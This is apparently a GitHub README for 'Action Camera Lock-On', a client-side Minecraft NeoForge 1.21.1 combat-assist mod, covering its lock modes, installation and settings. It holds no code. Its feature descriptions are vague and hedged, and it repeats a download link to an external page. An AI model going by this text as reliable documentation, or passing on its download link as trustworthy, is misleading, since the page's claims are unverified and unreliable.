# Action Camera Lock-On v1.0 - Game Script Utility 2026

> Client-side Minecraft NeoForge 1.21.1 mod for camera lock-on, target tracking, and configurable combat assistance.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20NeoForge%201.21.1-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noahyoung39/camera-lock-on-script?style=flat-square)](https://github.com/noahyoung39/camera-lock-on-script)

---

<p align="center">
  <a href="https://noahyoung39.github.io/camera-lock-on-script/">
    <img src="https://img.shields.io/badge/Download-Action%20Camera%20Lock-On%20Script-brightgreen?style=for-the-badge" alt="Download Action Camera Lock-On Script">
  </a>
</p>

> **[Download Latest Build](https://noahyoung39.github.io/camera-lock-on-script/)**

---

[Download Latest Build](https://noahyoung39.github.io/camera-lock-on-script/)

---

## What It Does

Action Camera Lock-On is a NeoForge 1.21.1 client mod for Minecraft that helps keep the camera oriented toward a selected target. Its focus is on target tracking, lock selection, and control options that can be adjusted through keybinds and the config screen.

Rather than automating combat outright, the mod is aimed at practical assistance. It offers several lock behaviors, on-screen reticle support, and filtering tools so you can tune how target lock behaves in different scenarios, including hostile-only selection and visibility-based checks.

## Included Features

- Smooth tracking to make camera movement feel steadier
- Smart Lock mode for adaptive target handling
- Always Lock mode for persistent focus on one target
- Target switching for moving between enemies during play
- Proximity-based priority to prefer closer targets
- Hostile-only filtering for more focused selection
- Line-of-sight checks to require visible targets
- 3D reticle rendering with configurable colors
- In-game configuration UI for fast tuning
- Keybind controls for toggles and lock actions

## Installation

1. Download the latest build from the project page.
2. Copy the mod file into your Minecraft mods folder.
3. Start Minecraft with NeoForge 1.21.1 installed.
4. Open the game and use the built-in configuration screen to set it up.

Common mods folder locations:
- Windows: `%appdata%/.minecraft/mods`
- macOS: `~/Library/Application Support/minecraft/mods`
- Linux: `~/.minecraft/mods`

If you use a launcher or instance manager, place the file in that instance's own mods directory.

## Configuration

The control labels can differ slightly between builds, but the core focus stays on customizable lock-on behavior.

| Setting | Purpose |
| --- | --- |
| Smart Lock | Adjusts target handling based on current conditions |
| Always Lock | Keeps focus on the selected target |
| Hostile Only | Limits target selection to hostile mobs |
| Line of Sight | Requires visibility before locking |
| Target Switching | Changes the active target when needed |
| Reticle Color | Customizes the 3D reticle appearance |
| Keybindings | Assigns shortcuts for lock and switch actions |

Example configuration flow:
- Open the mod's config screen in-game
- Choose your preferred lock mode
- Set target filters and reticle color
- Bind keys for quick switching or toggling

## Compatibility

Action Camera Lock-On is made for Minecraft NeoForge 1.21.1 and runs on the client side. Since it is built around Minecraft camera behavior and targeting rules, compatibility depends on the game version and the mod loader setup.

Known considerations:
- Designed for NeoForge, not other loaders
- Target behavior depends on nearby entities and visibility
- Some settings may feel different depending on camera movement and input bindings
- Exact feature names may vary with future updates

## FAQ

### How do I install it?
Download the build, place it in the mods folder for your instance, and launch Minecraft with NeoForge 1.21.1.

### Where do I change the settings?
Use the in-game configuration screen to adjust lock mode, filters, reticle appearance, and related options.

### Can I customize the targeting behavior?
Yes. The mod includes options for smart lock, always lock, target switching, proximity priority, hostile-only filtering, and line-of-sight checks.

### Does it work on other Minecraft versions?
This release is targeted at NeoForge 1.21.1. Other versions are not listed as supported here.

### Can I change the reticle look?
Yes. The feature set includes a 3D reticle and custom reticle colors.

### Where should I keep the file?
Store it in the mods folder of the Minecraft instance you want to use it with, especially if you manage multiple profiles or launchers.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
